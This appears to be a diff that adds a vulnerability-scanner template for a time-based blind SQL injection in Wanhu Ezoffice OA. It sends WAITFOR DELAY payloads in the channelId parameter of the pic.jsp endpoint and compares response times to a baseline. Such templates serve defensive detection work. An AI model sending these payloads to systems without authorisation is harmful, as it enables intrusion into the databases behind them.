@@ -1,0 +1,36 @@
+id: wanhu-defaultroot-sqli-1
+
+info:
+  name: 万户 Ezoffice OA defaultroot SQL注入
+  author: zan8in
+  severity: high
+  verified: false
+  description: |-
+    Hunter: app.name="万户 Ezoffice OA"
+  tags: wanhu,sqli
+  created: 2023/12/08
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/platform/portal/portlet/pic/pic.jsp?channelId=1
+    expression: response.status == 200
+    output: 
+      t0: response.latency
+  r1:
+    request:
+      method: GET
+      path: /defaultroot/platform/portal/portlet/pic/pic.jsp?channelId=1 WAITFOR DELAY '0:0:5'--+
+    expression: response.status == 200 && response.latency - t0 >= 4500
+  r2:
+    request:
+      method: GET
+      path: /defaultroot/platform/portal/portlet/pic/pic.jsp?channelId=1 WAITFOR DELAY '0:0:3'--+
+    expression: response.status == 200 && response.latency - t0 >= 2500
+  r3:
+    request:
+      method: GET
+      path: /defaultroot/platform/portal/portlet/pic/pic.jsp?channelId=1 WAITFOR DELAY '0:0:5'--+
+    expression: response.status == 200 && response.latency - t0 >= 4500
+expression: r0() && r1() && r2() && r3()
